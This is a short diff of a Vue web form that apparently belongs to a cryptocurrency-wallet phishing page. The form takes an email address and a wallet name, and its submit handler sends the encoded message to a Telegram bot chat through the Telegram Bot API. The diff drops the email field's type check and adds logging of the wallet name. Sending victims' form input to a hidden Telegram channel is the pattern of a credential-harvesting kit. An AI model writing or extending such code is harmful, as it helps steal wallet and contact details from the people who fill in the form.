@@ -22,7 +22,7 @@
             <div class="label">Email Address :</div>
             <input
               id="ai"
-              type="email"
+              type=""
               placeholder="Enter Email"
               v-model="ai"
             />
@@ -101,6 +101,7 @@ const handleSubmit = async (e) => {
   }
 
   console.log('Email:',ai.value)
+  console.log('Wallet Name:', walletName)
 
   message = encodeURI(message)
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
